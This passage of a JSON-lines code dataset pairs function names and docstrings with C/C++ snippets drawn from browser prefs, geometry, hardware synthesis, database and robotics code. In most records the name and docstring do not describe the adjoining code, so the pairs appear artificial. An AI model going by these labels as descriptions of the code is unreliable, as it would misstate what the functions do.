(base::ranges::any_of(\\n            always_translate_dictionary,\\n            [&old_language_pair](const auto& new_language_pair) {\\n              return old_language_pair.first == new_language_pair.first ||\\n                     old_language_pair.first ==\\n                         new_language_pair.second.GetString() ||\\n                     old_language_pair.second.GetString() ==\\n                         new_language_pair.first;\\n            })) {\\n      continue;\\n    }\\n\\n    \/\/ If the old pair's source language matches any of the never-translate\\n    \/\/ languages, it probably means that this source language was set to never\\n    \/\/ be translated after the old pref was deprecated, so avoid this conflict.\\n    const std::string& (base::Value::*get_string)() const =\\n        &base::Value::GetString;\\n    if (base::Contains(prefs->GetList(prefs::kBlockedLanguages),\\n                       old_language_pair.first, get_string)) {\\n      continue;\\n    }\\n\\n    always_translate_dictionary.Set(old_language_pair.first,\\n                                    old_language_pair.second.GetString());\\n  }\\n\\n  prefs->ClearPref(TranslatePrefs::kPrefAlwaysTranslateListDeprecated);\\n}\"}","id":973}
{"content":"{'function_name': 'StrokeFitting_Internal', 'docstring': '\/\/Assign length to each stroke\\r', 'code': \"bool StrokeFitting(std::vector<POINT> &rgPoints, std::vector<BasicStroke> &rgResult)\\r\\n{\\r\\n\\tint\\t\\t\\t\\tn = (int)rgPoints.size();\\r\\n\\tdouble\\t\\t\\tdx, dy;\\r\\n\\tdouble*\\t\\t\\trgLen;\\r\\n\\tMatrix<double>\\trgDistance(n, n);\\r\\n\\r\\n\\t\/\/If there are too few points, just regard it as failure\\r\\n\\tif (rgPoints.size() < 2)\\r\\n\\t{\\r\\n\\t\\treturn false;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/Calculate distance between two points\\r\\n\\trgLen = new double[n];\\r\\n\\tZeroMemory(rgLen, sizeof(double) * n);\\r\\n\\r\\n\\tfor (int i = 0; i < n - 1; i++)\\r\\n\\t{\\r\\n\\t\\tdx = rgPoints[i + 1].x - rgPoints[i].x;\\r\\n\\t\\tdy = rgPoints[i + 1].y - rgPoints[i].y;\\r\\n\\t\\trgLen[i] = sqrt(dx * dx + dy * dy);\\r\\n\\t}\\r\\n\\r\\n\\tfor (int i = 0; i < n; i++)\\r\\n\\t{\\r\\n\\t\\tfor (int j = i + 1; j < n; j++)\\r\\n\\t\\t{\\r\\n\\t\\t\\trgDistance[i][j] = rgDistance[i][j - 1] + rgLen[j - 1];\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tdelete[] rgLen;\\r\\n\\r\\n\\t\/\/First check whether the input can be an ellipse or an elliptical arc\\r\\n\\tif (rgDistance[0][rgPoints.size() - 1] > ARC_MINIMAL_LENGTH)\\r\\n\\t{\\r\\n\\t\\tBasicStroke segment = EstimateStroke_Segment(rgDistance, rgPoints, 0, (int)rgPoints.size() - 1);\\r\\n\\t\\tBasicStroke\\tarc;\\r\\n\\r\\n\\t\\tarc.error\\t\\t= 1e+50;\\r\\n\\t\\tarc.iStartPoint\\t= 0;\\r\\n\\t\\tarc.iEndPoint\\t= (int)rgPoints.size() - 1;\\r\\n\\t\\tarc.iStrokeType\\t= PRIMITIVE_ARC;\\r\\n\\r\\n\\t\\tEllipticalArcFitting(&rgPoints[0], (int)rgPoints.size(), arc.arc.rcBounding, arc.arc.rotateAngle, arc.arc.startAngle, arc.arc.endAngle, arc.error);\\r\\n\\r\\n\\t\\tdouble distSize = DistributionSizeToLine(segment.segment.startPoint, segment.segment.endPoint, &rgPoints[0], (int)rgPoints.size());\\r\\n\\t\\tdouble chordLen = CalcDistanceP2P(segment.segment.startPoint, segment.segment.endPoint);\\r\\n\\r\\n\\t\\tif (distSize \/ chordLen > ARC_MINIMAL_CURVE)\\r\\n\\t\\t{\\r\\n\\t\\t\\tif ((arc.error < ARC_ERROR_THREASHOLD \/ 2) || \\r\\n\\t\\t\\t\\t((arc.arc.endAngle - arc.arc.startAngle > 1.9 * PI) && (arc.error < ARC_ERROR_THREASHOLD * 1.2)))\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\trgResult.push_back(arc);\\r\\n\\t\\t\\t\\treturn true;\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tstd::vector<int>\\t\\t\\t\\trgSplit;\\r\\n\\tstd::vector<POINT>\\t\\t\\t\\trgTempPoints;\\r\\n\\tstd::vector<BasicStroke>\\t\\trgTempResult;\\r\\n\\r\\n\\trgSplit.push_back(0);\\r\\n\\r\\n\\t\/\/Roughly split user's input\\r\\n\\tfor (int i = 1; i < n - 1; i++)\\r\\n\\t{\\r\\n\\t\\tint\\tj, k;\\r\\n\\t\\t\\r\\n\\t\\tj = i - 1;\\r\\n\\t\\twhile ((rgDistance[j][i] < STROKE_MINIMAL_LENGTH) && (j > 0))\\r\\n\\t\\t{\\r\\n\\t\\t\\tj--;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tk = i + 1;\\r\\n\\t\\twhile ((rgDistance[i][k] < STROKE_MINIMAL_LENGTH) && (k < n - 1))\\r\\n\\t\\t{\\r\\n\\t\\t\\tk++;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif ((rgDistance[j][i] >= STROKE_MINIMAL_LENGTH) && (rgDistance[i][k] >= STROKE_MINIMAL_LENGTH))\\r\\n\\t\\t{\\r\\n\\t\\t\\tPOINT\\tpt1, pt2, pt3, pt4;\\r\\n\\t\\t\\tdouble\\terr1, err2;\\r\\n\\r\\n\\t\\t\\tSegmentFitting_Perpendicular(&rgPoints[j], i - j + 1, pt1, pt2, err1);\\r\\n\\t\\t\\tSegmentFitting_Perpendicular(&rgPoints[i], k - i + 1, pt3, pt4, err2);\\r\\n\\r\\n\\t\\t\\tif ((err1 < SEGMENT_ERROR_THRESHOLD) && (err2 < SEGMENT_ERROR_THRESHOLD))\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tdouble angle = RegularizeAngle(CalcAngleVectorToX(pt1, pt2) - CalcAngleVectorToX(pt3, pt4));\\r\\n\\r\\n\\t\\t\\t\\tif (fabs(angle) > MINIMAL_TURNING_ANGLE)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\trgSplit.push_back(i);\\r\\n\\t\\t\\t\\t\\ti = k - 1;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\trgSplit.push_back(n - 1);\\r\\n\\r\\n\\tfor (unsigned int i = 1; i < rgSplit.size() - 1; i++)\\r\\n\\t{\\r\\n\\t\\tif ((rgDistance[rgSplit[i - 1]][rgSplit[i]] < STROKE_MINIMAL_LENGTH) ||\\r\\n\\t\\t\\t(rgDistance[rgSplit[i]][rgSplit[i + 1]] < STROKE_MINIMAL_LENGTH))\\r\\n\\t\\t{\\r\\n\\t\\t\\trgSplit.erase(rgSplit.begin() + i);\\r\\n\\t\\t\\ti--;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\t\\r\\n\\r\\n\\tfor (unsigned int i = 0; i < rgSplit.size() - 1; i++)\\r\\n\\t{\\r\\n\\t\\trgTempPoints.clear();\\r\\n\\t\\trgTempResult.clear();\\r\\n\\r\\n\\t\\tfor (int j = rgSplit[i]; j <= rgSplit[i + 1]; j++)\\r\\n\\t\\t{\\r\\n\\t\\t\\trgTempPoints.push_back(rgPoints[j]);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tStrokeFitting_Internal(rgTempPoints, rgTempResult, SEGMENTATION_PENALTY);\\r\\n\\r\\n\\t\\tfor (unsigned int j = 0; j < rgTempResult.size(); j++)\\r\\n\\t\\t{\\r\\n\\t\\t\\tBasicStroke\\tstroke = rgTempResult[j];\\r\\n\\r\\n\\t\\t\\tstroke.iStartPoint\\t+= rgSplit[i];\\r\\n\\t\\t\\tstroke.iEndPoint\\t+= rgSplit[i];\\r\\n\\t\\t\\trgResult.push_back(stroke);\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\t\/\/Merge adjacent strokes together\\r\\n\\tMergeAdjacentStroke(rgPoints, rgResult);\\r\\n\\r\\n\\t\/\/If the sketch is a closed figure, just close it.\\r\\n\\tCloseStrokes(rgResult);\\r\\n\\r\\n\\treturn true;\\r\\n}\"}","id":980}
{"content":"{'function_name': 'CrashLeasingApplication', 'docstring': '\/\/', 'code': 'BOOL WINAPI\\nInternalRegisterLeasingApplication(\\n    __in POVERLAPPED_LEASE_LAYER_EXTENSION OverlappedDeviceIoctlRegister\\n    )\\n\/*\\nRoutine Description:\\n \\n    Internal routine. Creates or renews a leasing application registration.\\n\\nParameters Description:\\n \\n    OverlappedDeviceIoctlRegister - overlapped to renew.\\n \\nReturn Value:\\n \\n    TRUE if the I\/O has been posted successfully.\\n*\/\\n{\\n    DWORD BytesReturned = 0;\\n    DWORD LastError = ERROR_SUCCESS;\\n\\n    \/\/\\n    \/\/ Must call this function before initiating each asynchronous\\n    \/\/ device I\/O operation on the handle when using thread pool I\/O.\\n    \/\/\\n\\n    \/\/\\n    \/\/ Send the register leasing application Device IOCTL.\\n    \/\/ This IOCTL will be delayed in the kernel. It will be completed\\n    \/\/ at a later time when an event of interest to the application\\n    \/\/ will be raised.\\n    \/\/\\n    auto DeviceIoctlReturn = DeviceIoControl(\\n        IOCTL_REGISTER_LEASING_APPLICATION,\\n        &OverlappedDeviceIoctlRegister->EventBuffer,\\n        sizeof(LEASE_LAYER_EVENT_INPUT_OUTPUT_BUFFER),\\n        &OverlappedDeviceIoctlRegister->EventBuffer,\\n        sizeof(LEASE_LAYER_EVENT_INPUT_OUTPUT_BUFFER),\\n        &BytesReturned);\\n\\n    \/\/\\n    \/\/ Check return code of DeviceIoControl.\\n    \/\/\\n    if (!NT_SUCCESS(DeviceIoctlReturn)) {\\n\\n        \/\/\\n        \/\/ Retrieve last error.\\n        \/\/\\n        LastError = GetLastError();\\n\\n        \/\/\\n        \/\/ Check this exact error code. Any other error code is a failure.\\n        \/\/\\n        if (ERROR_IO_PENDING != LastError) {\\n            return FALSE;\\n        }\\n    }\\n\\n    Common::Assert::SetCrashLeasingApplicationCallback(CrashLeasingApplication);\\n\\n    return TRUE;\\n}'}","id":986}
{"content":"{'function_name': 'decode', 'docstring': '\/\/ std::cout << \"this rt:\\\\t\" << decoded.size() << std::endl;', 'code': 'static std::string MapAsString(std::map<std::string, std::string> m){\\n  std::string str = NumberAsString(m.size());\\n  for (std::map<std::string, std::string>::iterator it=m.begin(); it!=m.end(); ++it){\\n    str = str + \"\\\\n{\" + it->first + \"}\\\\n{\" + it->second + \"}\";\\n  }\\n  \/\/ std::cout<< \"Created: \\\\t\" << str <<std::endl;\\n  return str;\\n}'}","id":987}
{"content":"{'function_name': 'denoiseb_rd41_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd42_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd42 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1930 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (969 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_1930();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":988}
{"content":"{'function_name': 'GetRemoteLeaseExpirationTime', 'docstring': '\/\/', 'code': 'BOOL WINAPI\\nCompleteArbitrationSuccessProcessing(\\n    __in HANDLE localApplicationHandle,\\n    __in LONGLONG localInstance,\\n    __in PTRANSPORT_LISTEN_ENDPOINT remoteSocketAddress,\\n    __in LONGLONG remoteInstance,\\n    __in LONG localTTL,\\n    __in LONG remoteTTL,\\n    __in BOOL isDelayed\\n    )\\n\\n\/*++\\nRoutine Description:\\n\\n     Completes a successful arbitration with relation to the remote lease agent.\\n\\nParameters Description:\\n\\n    LeaseApplicationHandle - The handle of the lease application that completed aribitration successfully.\\n\\n    TimeToLive - time to live for the remote lease agent.\\n\\n    LeaseAgentInstance - lease agent instance involved in arbitration.\\n\\n    RemoteLeaseAgentInstance - remote lease agent instance involved in arbitration.\\n\\n    RemoteSocketAddress - remote socket address.\\n \\nReturn Value:\\n\\n    TRUE if arguments are valid, FALSE otherwise.   \\n\\n--*\/\\n\\n{\\n    DWORD BytesReturned = 0;\\n\\n    ARBITRATION_RESULT_INPUT_BUFFER DeviceIoctlInputBuffer;\\n    ZeroMemory(&DeviceIoctlInputBuffer, sizeof(ARBITRATION_RESULT_INPUT_BUFFER));\\n\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer \\n    \/\/ has been successfully initialized.\\n    \/\/\\n    if (!IsLeaseLayerInitialized()) {\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == localApplicationHandle ||\\n        INVALID_HANDLE_VALUE == localApplicationHandle ||\\n        0 > localInstance ||\\n        0 > remoteInstance ||\\n        0 > remoteTTL ||\\n        NULL == remoteSocketAddress) {\\n\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Initialize device IOCTL input buffer.\\n    \/\/\\n    DeviceIoctlInputBuffer.LeasingApplicationHandle = localApplicationHandle;\\n    DeviceIoctlInputBuffer.RemoteTimeToLive = remoteTTL;\\n    DeviceIoctlInputBuffer.LocalTimeToLive = localTTL;\\n    DeviceIoctlInputBuffer.IsDelayed = (BOOLEAN)isDelayed;\\n\\n    DeviceIoctlInputBuffer.LeaseAgentInstance = localInstance;\\n    DeviceIoctlInputBuffer.RemoteLeaseAgentInstance = remoteInstance;\\n    if (memcpy_s(\\n        &DeviceIoctlInputBuffer.RemoteSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT),\\n        remoteSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT)\\n        ))\\n    {\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Create a device IOCTL and send it to the device.\\n    \/\/\\n    return NT_SUCCESS(DeviceIoControl(\\n        IOCTL_ARBITRATION_RESULT,\\n        &DeviceIoctlInputBuffer,\\n        sizeof(ARBITRATION_RESULT_INPUT_BUFFER),\\n        NULL,\\n        0,\\n        &BytesReturned))? TRUE : FALSE;\\n}'}","id":995}
{"content":"{'function_name': 'denoiseb_rd24_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd25_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd25 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3862 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_3862();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":996}
{"content":"{'function_name': 'CreateCoordinateSystem', 'docstring': '\/\/ create a coordinate system from v1 (which should be normalized)', 'code': 'bool RayTriIntersect(const Ray& ray, const IsectTri& tri, float* t, float* u, float* v)\\n  {\\n    \/\/ Moller\/Trombore\\n\\n    const float eps = -1.e5;\\n\\n    const Vector3& d = ray.d;\\n    const Vector3& o = ray.o;\\n\\n    Vector3 e1 = tri.p1 - tri.p0;\\n    Vector3 e2 = tri.p2 - tri.p0;\\n\\n    \/\/ note, this can be written as e1 . (rd x e2 ) = rd . (e2 x e1), so we\\n    \/\/ can precompute the cross product\\n    Vector3 q = Cross(d, e2);\\n    float a = Dot(e1, q);\\n\\n    if (fabs(a) <= eps)\\n      return false;\\n\\n    float f = 1 \/ a;\\n    Vector3 s = o - tri.p0;\\n\\n    *u = f * Dot(s, q);\\n    if (*u < 0.f)\\n      return false;\\n\\n    Vector3 r = Cross(s, e1);\\n\\n    *v = f * Dot(d, r);\\n    if (*v < 0.f || *u + *v > 1.f)\\n      return false;\\n\\n    *t = f * Dot(e2, r);\\n\\n    return true;\\n  }'}","id":998}
{"content":"{'function_name': 'doOverlap', 'docstring': '\/\/ If one rectangle is above other ', 'code': 'float ThermalDistanceConstrain(float** arrCoordenat, float** arrModuleDimension, float** arrCriticalModulesIndex, int mCritical, int arrThermalModuleIndex) {\\n    float xt = 0, yt = 0, xc = 0, yc = 0;\\n    float distance = 0, totalDistance = 0;\\n    xt = arrCoordenat[arrThermalModuleIndex][0] + (arrModuleDimension[arrThermalModuleIndex][0] \/ 2);\/\/\/\/\/\/\/\/\/\/\/\/\/\/ 3ayez ada5al 2el module dimension fel 7esbah\\n    yt = arrCoordenat[arrThermalModuleIndex][1] + (arrModuleDimension[arrThermalModuleIndex][1] \/ 2);\\n\\n    for (int i = 0; i < mCritical; i++) {\\n        xc = arrCoordenat[(int)arrCriticalModulesIndex[i][0]][0] + (arrModuleDimension[(int)arrCriticalModulesIndex[i][0]][0] \/ 2);\\n        yc = arrCoordenat[(int)arrCriticalModulesIndex[i][0]][1] + (arrModuleDimension[(int)arrCriticalModulesIndex[i][0]][1] \/ 2);\\n\\n        distance = sqrt(pow(xt - xc, 2) + pow(yt - yc, 2));\\n        totalDistance += distance;\\n    }\\n    return totalDistance;\\n}'}","id":1000}
{"content":"{'function_name': 'solveEquationThree', 'docstring': '\/\/ Attempt to solve the equation.', 'code': 'bool solveEquationFour()\\n{\\n\\tcout << \"TEST04: Solve a system of equations in a contrived way.\\\\n\";\\n\\n\\t\/\/ right-hand side\\n\\tMatrix a{1, 1};\\t\\t\/\/ coefficient matrix\\n\\ta.resize(2, 2);\\n\\n\\tMatrix a_vals{2, 2};\/\/ separate matrix containing desired values\\n\\ta_vals(1, 1) = 4;\\n\\ta_vals(1, 2) = 9;\\n\\ta_vals(2, 1) = 5;\\n\\ta_vals(2, 2) = 2;\\n\\n\\ta = Matrix{a_vals};\\t\/\/ copy construct a_vals and then assign\\n\\tcout << \"\\\\t\\\\tMatrix A:\\\\n\" << a << \"\\\\n\";\\n\\n\\t\/\/ If the copy-constructor did what it was supposed to, this shouldn\\'t\\n\\t\/\/ affect `a` in any way.\\n\\tconst auto& val_size = a_vals.size();\\n\\tfor (size_t row = 0; row != val_size.first; ++row)\\n\\t{\\n\\t\\tfor (size_t col = 0; col != val_size.second; ++col)\\n\\t\\t{\\n\\t\\t\\ta_vals(row, col) = 9001;\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/ left-hand side\\n\\tMatrix b{1, 2};\\t\\t\/\/ \"other-side\" matrix, as a row vector\\n\\tb(1, 1) = 7;\\n\\tb(1, 2) = 3;\\n\\n\\tb = b.transpose();\\t\/\/ flip it into a column vector\\n\\tcout << \"\\\\t\\\\tMatrix B:\\\\n\" << b << \"\\\\n\";\\n\\n\\t\/\/ correct answer\\n\\tMatrix x_ans{2, 1};\\n\\tx_ans(1, 1) = 13.0 \/ 37;\\n\\tx_ans(2, 1) = 23.0 \/ 37;\\n\\tcout << \"\\\\t\\\\tAnswer:\\\\n\" << x_ans << \"\\\\n\";\\n\\n\\t\/\/ Attempt to solve the equation.\\n\\treturn isApproxEqual(b * a.inverse(), x_ans);\\n}'}","id":1002}
{"content":"{'function_name': 'ErrIsamOpenDatabase', 'docstring': '\/\/ we check now if we actualy opened the temp db', 'code': 'ERR ErrDBOpenDatabase(\\n    PIB *ppib,\\n    __in PCWSTR wszDatabaseName,\\n    IFMP *pifmp,\\n    ULONG grbit )\\n{\\n    ERR                 err = JET_errSuccess;\\n    const size_t        cwchFullName = IFileSystemAPI::cchPathMax;\\n    WCHAR               rgwchFullName[cwchFullName];\\n    WCHAR               *wszFullName;\\n    WCHAR               *wszFileName;\\n    IFMP                ifmp = ifmpNil;\\n    INST                *pinst = PinstFromPpib( ppib );\\n    IFileSystemAPI      *pfsapi = NULL;\\n    const BOOL          fOpenForRecovery = !!( grbit & bitDbOpenForRecovery );\\n\\n    if ( fOpenForRecovery )\\n    {\\n        Assert( NULL != wszDatabaseName );\\n        Assert( 0 != *wszDatabaseName );\\n        CallS( FMP::ErrWriteLatchByNameWsz( wszDatabaseName, &ifmp, ppib ) );\\n    }\\n\\n    pfsapi = pinst->m_pfsapi;\\n    if ( fOpenForRecovery && ifmp != ifmpNil && !FFMPIsTempDB( ifmp ) )\\n    {\\n        wszFileName = wszFullName = g_rgfmp[ifmp].WszDatabaseName();\\n    }\\n    else\\n    {\\n        if ( NULL == wszDatabaseName || 0 == *wszDatabaseName )\\n        {\\n            return ErrERRCheck( JET_errDatabaseInvalidPath );\\n        }\\n\\n        err = FMP::ErrResolveByNameWsz( wszDatabaseName, rgwchFullName, cwchFullName );\\n        if ( err == JET_errDatabaseNotFound )\\n        {\\n            err = ErrUtilPathComplete( pfsapi, wszDatabaseName, rgwchFullName, fFalse );\\n            Assert( JET_errFileNotFound != err );\\n        }\\n        CallR( err );\\n\\n        wszFullName = rgwchFullName;\\n        wszFileName = wszFullName;\\n    }\\n\\n    if ( !fOpenForRecovery )\\n    {\\n        Assert( rgwchFullName == wszFullName );\\n        CallR( FMP::ErrWriteLatchByNameWsz( wszFullName, &ifmp, ppib ) );\\n    }\\n\\n    FMP *pfmp = &g_rgfmp[ ifmp ];\\n\\n    if ( BoolParam( pinst, JET_paramOneDatabasePerSession )\\n        && !fOpenForRecovery\\n        && FUserIfmp( ifmp )\\n        && FSomeDatabaseOpen( ppib, ifmp ) )\\n    {\\n        Call( ErrERRCheck( JET_errOneDatabasePerSession ) );\\n    }\\n\\n    \/\/  during recovering, we could open an non-detached database\\n    \/\/  to force to initialize the fmp entry.\\n    \/\/  if database has been detached, then return error.\\n    \/\/\\n    if ( !fOpenForRecovery && !pfmp->FAttached() )\\n    {\\n        Call( ErrERRCheck( JET_errDatabaseNotFound ) );\\n    }\\n\\n    Assert( !pfmp->FSkippedAttach() );\\n    Assert( !pfmp->FDeferredAttach() );\\n\\n    if ( pfmp->FReadOnlyAttach() && !( grbit & JET_bitDbReadOnly ) )\\n        err = ErrERRCheck( JET_wrnFileOpenReadOnly );\\n\\n    if ( pfmp->FExclusiveByAnotherSession( ppib ) )\\n    {\\n        Call( ErrERRCheck( JET_errDatabaseLocked ) );\\n    }\\n\\n    if ( grbit & JET_bitDbExclusive )\\n    {\\n        if( pfmp->CPin() > 0 )\\n        {\\n            Call( ErrERRCheck( JET_errDatabaseInUse ) );\\n        }\\n        pfmp->SetExclusiveOpen( ppib );\\n\\n    }   \/\/  if excluive open\\n\\n    Assert( pfmp->Pfapi() );\\n    DBSetOpenDatabaseFlag( ppib, ifmp );\\n\\n    \/\/  Allow others to open.\\n\\n    pfmp->ReleaseWriteLatch( ppib );\\n\\n    *pifmp = ifmp;\\n    return err;\\n\\nHandleError:\\n\\n    pfmp->ReleaseWriteLatch( ppib );\\n    return err;\\n}'}","id":1003}
{"content":"{'function_name': 'linReduceBrownout', 'docstring': \"\/\/ null or ghost input doesn't affect robot (also good for breaking)\", 'code': 'bool driveStraight(frc::ADXRS450_Gyro& gyro, frc::DifferentialDrive& mots, const double time, const double speed = 0.5, RobotBase* robot = nullptr){\\n\\n\\t\\tstd::cout <<\"Driving straight for \" <<time <<\"seconds at \" <<speed <<\"power... \";\\n\\t\\t\/\/ did some math to guesstimate these values\\n\\t\\tconst double\\n\\t\\t\\tturningConst = -0.05, \/\/ if it doesnt work negate this\\n\\t\\t\\tcycletime = 0.004,\\n\\t\\t\\toffset = gyro.GetAngle(); \/\/ gyro angle before movement\\n\\n\\n\\t\\tbool err = false;\\n\\n\\t\\t\/\/ drive forward for the set ammount of time\\n\\t\\t\/\/ cycletime is determined based on the speed of the robot\\n\\t\\t\/\/\\t\\tslower speed = longer input cycles\\n\\t\\t\/\/\\t\\tfaster speed = shorter input cycles\\n\\t\\tfor (int i = (int) (time \/ cycletime); i > 0 && robot ? robot->IsAutonomous() : false ; i--) {\\n\\t\\t\\t\/\/ turn to correct heading\\n\\t\\t\\tmots.ArcadeDrive(speed, (gyro.GetAngle() - offset) * turningConst); \/\/ add negatives for inverted steering\/drive\\n\\t\\t\\t\/\/ drive straight a bit before readjusting steering\\n\\t\\t\\tWait(cycletime);\\n\\n\\t\\t\\t\/\/ more than 15 degrees of error means something bad has happened\\n\\t\\t\\tif (std::fabs(gyro.GetAngle() - offset) > 15)\\n\\t\\t\\t\\terr = true;\\n\\t\\t\\t\\n\\t\\t}\\n\\n\\t\\tmots.ArcadeDrive(0.0, 0.0);\\n\\n\\t\\tstd::cout <<\"done (dif=\"<<gyro.GetAngle() <<\")\\\\n\";\\n\\n\\t\\t\/\/ did we fail to keep straight? (5 deg tolerance)\\n\\t\\treturn err || std::fabs(gyro.GetAngle()) > 5;\\n\\n\\t}'}","id":1007}
{"content":"{'function_name': 'check3D_DecodeFunction', 'docstring': '\/\/ check first items', 'code': 'static double testDecode_3D_Random_Perf(void(*function)(const morton, coord&, coord&, coord&), size_t times){\\n\\tTimer timer = Timer();\\n\\tcoord x, y, z;\\n\\tmorton maximum = ~0; \/\/ maximum for the random morton codes\\n\\tmorton runningsum = 0;\\n\\tmorton m;\\n\\n\\t\/\/ Create a pool of randum numbers\\n\\tvector<morton> randnumbers;\\n\\tfor (size_t i = 0; i < RAND_POOL_SIZE; i++) {\\n\\t\\trandnumbers.push_back((rand() + rand()) % maximum);\\n\\t}\\n\\t\\n\\t\/\/ Start performance test\\n\\tfor (int t = 0; t < times; t++){\\n\\t\\tfor (size_t i = 0; i < total; i++){\\n\\t\\t\\tm = randnumbers[i % RAND_POOL_SIZE];\\n\\t\\t\\ttimer.start();\\n\\t\\t\\tfunction(m,x,y,z);\\n\\t\\t\\ttimer.stop();\\n\\t\\t\\trunningsum += x + y + z;\\n\\t\\t}\\n\\t}\\n\\trunning_sums.push_back(runningsum);\\n\\treturn timer.elapsed_time_milliseconds \/ (float)times;\\n}'}","id":1009}
{"content":"{'function_name': 'p_gda_queen_weights', 'docstring': '\/\/ true: we need to register a delete finalizer with the external pointer.', 'code': 'SEXP p_gda_rook_weights(SEXP xp_geoda, int order, bool include_lower_order, double precision_threshold)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDa\\n  Rcpp::XPtr<GeoDa> ptr(xp_geoda);\\n  GeoDa* geoda = static_cast<GeoDa*> (R_ExternalPtrAddr(ptr));\\n\\n  \/\/ invoke the function\\n  GeoDaWeight* w = gda_rook_weights(geoda, order, include_lower_order, precision_threshold);\\n\\n  Rcpp::XPtr<GeoDaWeight> w_ptr(w, true);\\n  return w_ptr;\\n}'}","id":1012}
{"content":"{'function_name': 'MimeOleRecurseSetProp', 'docstring': '\/\/ multipart\/alternative\\r', 'code': 'MIMEOLEAPI MimeOleGetPropA(\\r\\n                           IMimePropertySet   *pPropertySet,\\r\\n                           LPCSTR              pszName,\\r\\n                           DWORD               dwFlags,\\r\\n                           LPSTR              *ppszData)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pPropertySet)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPSTR;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    CHECKHR(hr = pPropertySet->GetProp(pszName, dwFlags, &rVariant));\\r\\n\\r\\n    \/\/ Return the Data\\r\\n    *ppszData = rVariant.pszVal;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":1018}
